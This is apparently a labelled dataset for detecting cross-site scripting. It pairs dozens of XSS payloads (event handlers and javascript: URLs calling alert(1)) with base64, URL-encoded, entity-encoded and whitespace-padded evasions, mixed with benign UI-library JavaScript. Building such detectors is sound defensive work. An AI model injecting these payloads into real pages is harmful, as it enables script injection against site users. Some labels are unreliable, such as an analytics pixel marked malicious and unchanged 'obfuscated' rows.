payload_original,payload_obfuscated,label,technique
<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>,<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>,1,comment_marker
"instancemap.set(key, instance)","instancemap.set(key, instance)",0,none
"const clickcallback = () => { if (this._config.backdrop === 'static') { eventhandler.trigger(this._element, event_hide_prevented)","const clickcallback = () => { if (this._config.backdrop === 'static') { eventhandler.trigger(this._element, event_hide_prevented)",0,none
this.el.m_carousel = undefined; } _setupeventhandlers() {,this.el.m_carousel = undefined; } _setupeventhandlers() {,0,none
return elementmap.get(element).get(key) || null,return elementmap.get(element).get(key) || null,0,none
container.append(tip),container.append(tip),0,none
"var isoriginside = [top, left].indexof(baseplacement) !== -1","var isoriginside = [top, left].indexof(baseplacement) !== -1",0,none
this.addchip({ tag: val });,this.addchip({ tag: val });,0,none
"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=unknown&amp;rft.btitle=acm+computing+classification+system%3a+artificial+intelligence&amp;rft.pub=acm&amp;rft.date=1998&amp;rft_id=http%3a%2f%2fwww.acm.org%2fclass%2f1998%2fi.2.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=unknown&amp;rft.btitle=acm+computing+classification+system%3a+artificial+intelligence&amp;rft.pub=acm&amp;rft.date=1998&amp;rft_id=http%3a%2f%2fwww.acm.org%2fclass%2f1998%2fi.2.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
"var tab = this.$tablinks.filter('[href=""#' + tabid + '""]'); if (tab.length) { tab.trigger('click');","var tab = this.$tablinks.filter('[href=""#' + tabid + '""]'); if (tab.length) { tab.trigger('click');",0,none
<script>eval('\141lert(1)')</script> <script>eval('alert(\061)')</script> <script>eval('alert(\61)')</script>,PHNjcmlwdD5ldmFsKCdcMTQxbGVydCgxKScpPC9zY3JpcHQ+IDxzY3JpcHQ+ZXZhbCgnYWxlcnQoXDA2MSknKTwvc2NyaXB0PiA8c2NyaXB0PmV2YWwoJ2FsZXJ0KFw2MSknKTwvc2NyaXB0Pg==,1,base64
"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>","<div dra/*OBF*/ggable=""true"" contenteditable>drag m/*OBF*/e</div><center ondragover=alert(1) contenteditable>drop here</center>",1,comment_marker
"<rt onmouseleave=""alert(1)"">test</rt>",&lt;rt onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/rt&gt;,1,html_entities
value: function _createoverlay() { var overlay = document.createelement('div'); this._closebound = this.close.bind(this);,value: function _createoverlay() { var overlay = document.createelement('div'); this._closebound = this.close.bind(this);,0,none
<strong onpointerover=alert(1)>xss</strong>,&lt;strong onpointerover=alert(1)&gt;xss&lt;/strong&gt;,1,html_entities
} dispose() { cleartimeout(this._timeout),} dispose() { cleartimeout(this._timeout),0,none
if (index_js.isdisabled(this._element) || this._isshown()) { return; },if (index_js.isdisabled(this._element) || this._isshown()) { return; },0,none
modalbodyinput.value = recipient,modalbodyinput.value = recipient,0,none
"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Ctd%20ondrop%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Ftd%3E,1,urlencode
"<div id=""mw-panel"">","<div id=""mw-panel"">",0,none
"} return ( `<td data-day=""${opts.day}"" class=""${arr.join(' ')}"" aria-selected=""${ariaselected}"">` +","} return ( `<td data-day=""${opts.day}"" class=""${arr.join(' ')}"" aria-selected=""${ariaselected}"">` +",0,none
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",%3Cvideo%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,1,urlencode
"const complete = () => { this._element.classlist.remove(class_name_showing); eventhandler.trigger(this._element, event_shown);","const complete = () => { this._element.classlist.remove(class_name_showing); eventhandler.trigger(this._element, event_shown);",0,none
"<blink onclick=""alert(1)"">test</blink>",PGJsaW5rIG9uY2xpY2s9ImFsZXJ0KDEpIj50ZXN0PC9ibGluaz4=,1,base64
<legend onpointerdown=alert(1)>xss</legend>,<legend onpointerdown=alert(1)>xss</legend>,1,comment_marker
const event_keydown = `keydown${event_key$1}`,const event_keydown = `keydown${event_key$1}`,0,none
"<li><a href=""/wiki/green_computing"" title=""green computing"">energy consumption (green computing) </a> </li>","<li><a href=""/wiki/green_computing"" title=""green computing"">energy consumption (green computing) </a> </li>",0,none
animoptions.translatex = -100,animoptions.translatex = -100,0,none
<dd onpointermove=alert(1)>xss</dd>,PGRkIG9ucG9pbnRlcm1vdmU9YWxlcnQoMSk+eHNzPC9kZD4=,1,base64
"if ( entry !== undefined && typeof entry !== 'string' && entry !== false ) { throw new error(""nouislider: 'cssprefix' must be a string or `false`.""); }","if ( entry !== undefined && typeof entry !== 'string' && entry !== false ) { throw new error(""nouislider: 'cssprefix' must be a string or `false`.""); }",0,none
"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;frame ondragover=alert(1) contenteditable&gt;drop here&lt;/frame&gt;,1,html_entities
if (!$(el).hasclass('active')) {,if (!$(el).hasclass('active')) {,0,none
"if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, function () {","if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, function () {",0,none
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>","<style>@keyframes x{}</s/*OBF*/tyle><map style=""animation-name:x"" onani/*OBF*/mationend=""alert(1)""></map>",1,comment_marker
"}; class tabs extends component { constructor(el, options) {","}; class tabs extends component { constructor(el, options) {",0,none
"<div id=""right-navigation"">","<div id=""right-navigation"">",0,none
"<summary onmouseover=""alert(1)"">test</summary>",%3Csummary%20onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,1,urlencode
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cmeta%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fmeta%3E,1,urlencode
} else if (typeof exports !== 'undefined' && !exports.nodetype) {,} else if (typeof exports !== 'undefined' && !exports.nodetype) {,0,none
"<optgroup onmousedown=""alert(1)"">test</optgroup>",PG9wdGdyb3VwIG9ubW91c2Vkb3duPSJhbGVydCgxKSI+dGVzdDwvb3B0Z3JvdXA+,1,base64
"<marquee onmouseleave=""alert(1)"">test</marquee>",%3Cmarquee%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fmarquee%3E,1,urlencode
<span id=x tabindex=1 onfocusin=alert(1)></span>,<span id=x tabindex=1 onfocusin=alert(1)><  /span>,1,whitespace_noise
if (this._config.focus) { this._focustrap.activate(); },if (this._config.focus) { this._focustrap.activate(); },0,none
"<kbd onbeforecut=""alert(1)"" contenteditable>test</kbd>",%3Ckbd%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fkbd%3E,1,urlencode
value: function _renderdatedisplay() { var displaydate = datepicker._isdate(this.date) ? this.date : new date(); var i18n = this.options.i18n;,value: function _renderdatedisplay() { var displaydate = datepicker._isdate(this.date) ? this.date : new date(); var i18n = this.options.i18n;,0,none
"import { executeaftertransition, getelement } from './util/index.js'","import { executeaftertransition, getelement } from './util/index.js'",0,none
value: function getinstance(el) { var domelem = !!el.jquery ? el[0] : el; return domelem.m_sidenav;,value: function getinstance(el) { var domelem = !!el.jquery ? el[0] : el; return domelem.m_sidenav;,0,none
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;th ondragover=alert(1) contenteditable&gt;drop here&lt;/th&gt;,1,html_entities
if (includescale === void 0) { includescale = false; },if (includescale === void 0) { includescale = false; },0,none
"return { top: rect.top + win.pageyoffset - docel.clienttop, left: rect.left + win.pagexoffset - docel.clientleft","return { top: rect.top + win.pageyoffset - docel.clienttop, left: rect.left + win.pagexoffset - docel.clientleft",0,none
"this.$el.attr('width', this.attrwidth); } if (this.attrheight) {","this.$el.attr('width', this.attrwidth); } if (this.attrheight) {",0,none
opts.i18n.months[i] +,opts.i18n.months[i] +,0,none
var ownerdocument = node.ownerdocument,var ownerdocument = node.ownerdocument,0,none
} }]); return modal;,} }]); return modal;,0,none
"<q onmouseup=""alert(1)"">test</q>","<q onmouseup="" alert(1)"">test</ q>",1,whitespace_noise
"var args = slice.call(arguments),","var args = slice.call(arguments),",0,none
} _movedropdown(containerel) { if (!!this.options.container) {,} _movedropdown(containerel) { if (!!this.options.container) {,0,none
<svg><label onload=alert(1)></label>,<svg><label onload=alert(1)></label>,1,comment_marker
"<select onpaste=""alert(1)"" contenteditable>test</select>","<select onpaste=""alert(1)"" contenteditable>test</select>",1,whitespace_noise
"this.options.onchipselect.call(this, this.$el, $chip[0]); } }","this.options.onchipselect.call(this, this.$el, $chip[0]); } }",0,none
"<script> !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments); },s.version='1.1',s.queue=[],u=t.createelement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',a=t.getelementsbytagname(n)[0],a.parentnode.insertbefore(u,a))}(window,document,'script'); twq('init','twitter_pixel_id');twq('track', 'pageview'); </script>",%3Cscript%3E%20%21function%28e%2Ct%2Cn%2Cs%2Cu%2Ca%29%7Be.twq%7C%7C%28s%3De.twq%3Dfunction%28%29%7Bs.exe%3Fs.exe.apply%28s%2Carguments%29%3As.queue.push%28arguments%29%3B%20%7D%2Cs.version%3D%271.1%27%2Cs.queue%3D%5B%5D%2Cu%3Dt.createelement%28n%29%2Cu.async%3D%210%2Cu.src%3D%27https%3A%2F%2Fstatic.ads-twitter.com%2Fuwt.js%27%2Ca%3Dt.getelementsbytagname%28n%29%5B0%5D%2Ca.parentnode.insertbefore%28u%2Ca%29%29%7D%28window%2Cdocument%2C%27script%27%29%3B%20twq%28%27init%27%2C%27twitter_pixel_id%27%29%3Btwq%28%27track%27%2C%20%27pageview%27%29%3B%20%3C%2Fscript%3E,1,urlencode
document.body.style.cursor = getcomputedstyle(event.target).cursor,document.body.style.cursor = getcomputedstyle(event.target).cursor,0,none
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>","<style>@keyframes x{}</style>  <label style="" animation-name:x""  onanimationend=""alert(1)  ""></label>",1,whitespace_noise
let spanel = $('<span></span>'); spanel.html(multiplecheckbox); liel.addclass(`${disabledclass} ${optgroupclass}`);,let spanel = $('<span></span>'); spanel.html(multiplecheckbox); liel.addclass(`${disabledclass} ${optgroupclass}`);,0,none
<sub onpointerdown=alert(1)>xss</sub>,<sub onpointerdown=alert(1)>xss</sub>,1,whitespace_noise
scrollspy._visibleelements = scrollspy._visibleelements.filter(function (value) { return value.height() != 0; });,scrollspy._visibleelements = scrollspy._visibleelements.filter(function (value) { return value.height() != 0; });,0,none
} this._getelement().classlist.remove(class_name_show); this._emulateanimation(() => {,} this._getelement().classlist.remove(class_name_show); this._emulateanimation(() => {,0,none
settimeout(,settimeout%28,1,urlencode
"<a href=""j&#x61vascript:alert(1)"">xss</a> <a href=""&#x6a avascript:alert(1)"">xss</a> <a href=""&#x6a avascript:alert(1)"">xss</a>",PGEgaHJlZj0iaiYjeDYxdmFzY3JpcHQ6YWxlcnQoMSkiPnhzczwvYT4gPGEgaHJlZj0iJiN4NmEgYXZhc2NyaXB0OmFsZXJ0KDEpIj54c3M8L2E+IDxhIGhyZWY9IiYjeDZhIGF2YXNjcmlwdDphbGVydCgxKSI+eHNzPC9hPg==,1,base64
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;frameset style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/frameset&gt;,1,html_entities
value: function _handlescroll() {,value: function _handlescroll() {,0,none
let domelem = !!el.jquery ? el[0] : el,let domelem = !!el.jquery ? el[0] : el,0,none
"} function bootstraphandler(element, fn) { return function handler(event) {","} function bootstraphandler(element, fn) { return function handler(event) {",0,none
complete: (anim) => { if (this.options.autofocus) { this.dropdownel.focus();,complete: (anim) => { if (this.options.autofocus) { this.dropdownel.focus();,0,none
"return domelem.m_formselect; } }, {","return domelem.m_formselect; } }, {",0,none
"fireevent('set', handlenumber, true)","fireevent('set', handlenumber, true)",0,none
return findshadowroot(element.parentnode) } const noop = () => {},return findshadowroot(element.parentnode) } const noop = () => {},0,none
return scrollspy; }(component); scrollspy._elements = [];,return scrollspy; }(component); scrollspy._elements = [];,0,none
if (this.tabwidth !== 0 && this.tabswidth !== 0) { this._indicator.style.left = this._calcleftpos(this.$activetablink) + 'px'; this._indicator.style.right = this._calcrightpos(this.$activetablink) + 'px';,if (this.tabwidth !== 0 && this.tabswidth !== 0) { this._indicator.style.left = this._calcleftpos(this.$activetablink) + 'px'; this._indicator.style.right = this._calcrightpos(this.$activetablink) + 'px';,0,none
if (len === 0 && object[0].validity.badinput === false && !object.is(':required')) {,if (len === 0 && object[0].validity.badinput === false && !object.is(':required')) {,0,none
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;frameset ondragover=alert(1) contenteditable&gt;drop here&lt;/frameset&gt;,1,html_entities
"<bgsound onmouseup=""alert(1)"">test</bgsound>",%3Cbgsound%20onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fbgsound%3E,1,urlencode
"var matchstart = $el.text().tolowercase().indexof('' + string.tolowercase() + ''),","var matchstart = $el.text().tolowercase().indexof('' + string.tolowercase() + ''),",0,none
"<meter draggable=""true"" ondragleave=""alert(1)"">test</meter>",%3Cmeter%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fmeter%3E,1,urlencode
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></li>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Cli%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fli%3E,1,urlencode
"<font onkeypress=""alert(1)"" contenteditable>test</font>",%3Cfont%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ffont%3E,1,urlencode
<sub onpointerleave=alert(1)>xss</sub>,<sub onpointerleave=alert(1)>xss< /sub>,1,whitespace_noise
var renderedchip = document.createelement('div'),var renderedchip = document.createelement('div'),0,none
"<i onpaste=""alert(1)"" contenteditable>test</i>",&lt;i onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/i&gt;,1,html_entities
"<li><a href=""/wiki/natalia_bekhtereva"" title=""natalia bekhtereva"">natalia bekhtereva </a> </li>","<li><a href=""/wiki/natalia_bekhtereva"" title=""natalia bekhtereva"">natalia bekhtereva </a> </li>",0,none
} } if ( value > nearbysteps.thisstep.startvalue ) {,} } if ( value > nearbysteps.thisstep.startvalue ) {,0,none
<rtc onpointerenter=alert(1)>xss</rtc>,&lt;rtc onpointerenter=alert(1)&gt;xss&lt;/rtc&gt;,1,html_entities
<output onpointerout=alert(1)>xss</output>,PG91dHB1dCBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9vdXRwdXQ+,1,base64
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;tt ondragover=alert(1) contenteditable&gt;drop here&lt;/tt&gt;,1,html_entities
<title onpointermove=alert(1)>xss</title>,&lt;title onpointermove=alert(1)&gt;xss&lt;/title&gt;,1,html_entities
"_inherits(tooltip, _component7); function tooltip(el, options) { _classcallcheck(this, tooltip);","_inherits(tooltip, _component7); function tooltip(el, options) { _classcallcheck(this, tooltip);",0,none
var body = (_element$ownerdocumen = element.ownerdocument) == null ? void 0 : _element$ownerdocumen.body,var body = (_element$ownerdocumen = element.ownerdocument) == null ? void 0 : _element$ownerdocumen.body,0,none
"this.$slides.each((el, index) => {","this.$slides.each((el, index) => {",0,none
"<object oncopy=""alert(1)"" contenteditable>test</object>",&lt;object oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/object&gt;,1,html_entities
"const showevent = eventhandler.trigger(this._element, event_show$5, relatedtarget); if (showevent.defaultprevented) { return;","const showevent = eventhandler.trigger(this._element, event_show$5, relatedtarget); if (showevent.defaultprevented) { return;",0,none
"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>","<h1 onkeyup= ""alert(1)  "" contenteditable>test</  h1>",1,whitespace_noise
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></th>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Cth%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fth%3E,1,urlencode
<dd onpointerout=alert(1)>xss</dd>,PGRkIG9ucG9pbnRlcm91dD1hbGVydCgxKT54c3M8L2RkPg==,1,base64
"const default$5 = { backdrop: true, keyboard: true,","const default$5 = { backdrop: true, keyboard: true,",0,none
"const tab_nav_backward = 'backward'; const default = { autofocus: true,","const tab_nav_backward = 'backward'; const default = { autofocus: true,",0,none
"<p oncut=""alert(1)"" contenteditable>test</p>",PHAgb25jdXQ9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvcD4=,1,base64
var winscroll = getwindowscroll(element),var winscroll = getwindowscroll(element),0,none
this.showindicators = this.options.indicators && this.hasmultipleslides; this.nowrap = this.options.nowrap || !this.hasmultipleslides; this.pressed = false;,this.showindicators = this.options.indicators && this.hasmultipleslides; this.nowrap = this.options.nowrap || !this.hasmultipleslides; this.pressed = false;,0,none
"elementstyle = ''; } wrapper.setattribute('style', elementstyle);","elementstyle = ''; } wrapper.setattribute('style', elementstyle);",0,none
} const tip = this._gettipelement() tip.classlist.remove(class_name_show),} const tip = this._gettipelement() tip.classlist.remove(class_name_show),0,none
"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PG1haW4gb25kcmFnb3Zlcj1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC9tYWluPg==,1,base64
this.activeindex = 0; this.$active = this.$slides.eq(this.activeindex); if (this.options.indicators) {,this.activeindex = 0; this.$active = this.$slides.eq(this.activeindex); if (this.options.indicators) {,0,none
"</span> <span class=""reference-text""><cite class=""citation conference"">bertini, m; del bimbo, a; torniai, c (2006). ""automatic annotation and semantic retrieval of video sequences using multimedia ontologies"". <i>mm '06 proceedings of the 14th acm international conference on multimedia </i>. 14th acm international conference on multimedia. santa barbara: acm. pp.&#160;679–682. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=conference&amp;rft.atitle=automatic+annotation+and+semantic+retrieval+of+video+sequences+using+multimedia+ontologies&amp;rft.btitle=mm+%2706+proceedings+of+the+14th+acm+international+conference+on+multimedia&amp;rft.place=santa+barbara&amp;rft.pages=679-682&amp;rft.pub=acm&amp;rft.date=2006&amp;rft.aulast=bertini&amp;rft.aufirst=m&amp;rft.au=del+bimbo%2c+a&amp;rft.au=torniai%2c+c&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span> <span class=""reference-text""><cite class=""citation conference"">bertini, m; del bimbo, a; torniai, c (2006). ""automatic annotation and semantic retrieval of video sequences using multimedia ontologies"". <i>mm '06 proceedings of the 14th acm international conference on multimedia </i>. 14th acm international conference on multimedia. santa barbara: acm. pp.&#160;679–682. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=conference&amp;rft.atitle=automatic+annotation+and+semantic+retrieval+of+video+sequences+using+multimedia+ontologies&amp;rft.btitle=mm+%2706+proceedings+of+the+14th+acm+international+conference+on+multimedia&amp;rft.place=santa+barbara&amp;rft.pages=679-682&amp;rft.pub=acm&amp;rft.date=2006&amp;rft.aulast=bertini&amp;rft.aufirst=m&amp;rft.au=del+bimbo%2c+a&amp;rft.au=torniai%2c+c&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
<audio src/onerror=alert(1)>,<audio src/onerror=alert(1)>,1,whitespace_noise
"<object onkeypress=""alert(1)"" contenteditable>test</object>",%3Cobject%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fobject%3E,1,urlencode
"'use strict'; var _defaults = { dialradius: 135,","'use strict'; var _defaults = { dialradius: 135,",0,none
<param id=x tabindex=1 onfocusin=alert(1)></param>,%3Cparam%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fparam%3E,1,urlencode
"<li id=""cite_note-299""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-299"">^ </a> </b>","<li id=""cite_note-299""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-299"">^ </a> </b>",0,none
"<source oncut=""alert(1)"" contenteditable>test</source>",PHNvdXJjZSBvbmN1dD0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9zb3VyY2U+,1,base64
"this._previousscrolldata = { visibleentrytop: 0, parentscrolltop: 0","this._previousscrolldata = { visibleentrytop: 0, parentscrolltop: 0",0,none
"} const showevent = eventhandler.trigger(this._element, event_show$3, { relatedtarget","} const showevent = eventhandler.trigger(this._element, event_show$3, { relatedtarget",0,none
"<font oncut=""alert(1)"" contenteditable>test</font>",&lt;font oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/font&gt;,1,html_entities
"this._swipehelper = new swipe(this._element, swipeconfig)","this._swipehelper = new swipe(this._element, swipeconfig)",0,none
totaldeltax = 0; } let transformx = -totaldeltax;,totaldeltax = 0; } let transformx = -totaldeltax;,0,none
"<data onmouseleave=""alert(1)"">test</data>",PGRhdGEgb25tb3VzZWxlYXZlPSJhbGVydCgxKSI+dGVzdDwvZGF0YT4=,1,base64
"<li id=""cite_note-375""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-375"">^ </a> </b>","<li id=""cite_note-375""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-375"">^ </a> </b>",0,none
<caption id=x tabindex=1 onfocusin=alert(1)></caption>,<caption id=x tabindex= 1 onfocusin=  alert(1)>  </caption>,1,whitespace_noise
'>' + opts.i18n.months[i] + '</option>','>' + opts.i18n.months[i] + '</option>',0,none
"istoday = datepicker._comparedates(day, now),","istoday = datepicker._comparedates(day, now),",0,none
"<noscript onbeforecopy=""alert(1)"" contenteditable>test</noscript>",PG5vc2NyaXB0IG9uYmVmb3JlY29weT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9ub3NjcmlwdD4=,1,base64
if (before < 0) { before += 7; },if (before < 0) { before += 7; },0,none
this.$activetablink = this.$tablinks.eq(this.index); this.$activetablink.addclass('active'); this._animateindicator(previndex);,this.$activetablink = this.$tablinks.eq(this.index); this.$activetablink.addclass('active'); this._animateindicator(previndex);,0,none
var eventtype = targetevent.split('.')[0]; if ( eventname === eventtype ) { scope_events[targetevent].foreach(function( callback ) {,var eventtype = targetevent.split('.')[0]; if ( eventname === eventtype ) { scope_events[targetevent].foreach(function( callback ) {,0,none
_this21._setupeventhandlers(),_this21._setupeventhandlers(),0,none
if (!element || !swipe.issupported()) { return; },if (!element || !swipe.issupported()) { return; },0,none
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationstart=""alert(1)""></footer>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cfooter%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Ffooter%3E,1,urlencode
"<img onmouseout=""alert(1)"">test</img>",%3Cimg%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fimg%3E,1,urlencode
"<select onmousemove=""alert(1)"">test</select>",%3Cselect%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fselect%3E,1,urlencode
if (!templateelement) { return; },if (!templateelement) { return; },0,none
"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",PHN0eWxlPkBrZXlmcmFtZXMgc2xpZGVpbiB7fTwvc3R5bGU+PHJ1Ynkgc3R5bGU9ImFuaW1hdGlvbi1kdXJhdGlvbjoxczthbmltYXRpb24tbmFtZTpzbGlkZWluO2FuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6MiIgb25hbmltYXRpb25pdGVyYXRpb249ImFsZXJ0KDEpIj48L3J1Ynk+,1,base64
"<li draggable=""true"" ondragleave=""alert(1)"">test</li>",%3Cli%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,1,urlencode
"let min = this.options.mindate,","let min = this.options.mindate,",0,none
} } static _xpos(e) {,} } static _xpos(e) {,0,none
return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime()),return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime()),0,none
<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>,<source id= x tabindex=  1 onbeforedeactivate=  alert(1)></source><input autofocus>,1,whitespace_noise
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>,&lt;thead id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/thead&gt;&lt;input autofocus&gt;,1,html_entities
var _this11 = this; anim.remove(this.dropdownel); anim({,var _this11 = this; anim.remove(this.dropdownel); anim({,0,none
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></plaintext>","< style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=  ""alert(1)""></plaintext>",1,whitespace_noise
"<datalist onmouseover=""alert(1)"">test</datalist>",&lt;datalist onmouseover=&quot;alert(1)&quot;&gt;test&lt;/datalist&gt;,1,html_entities
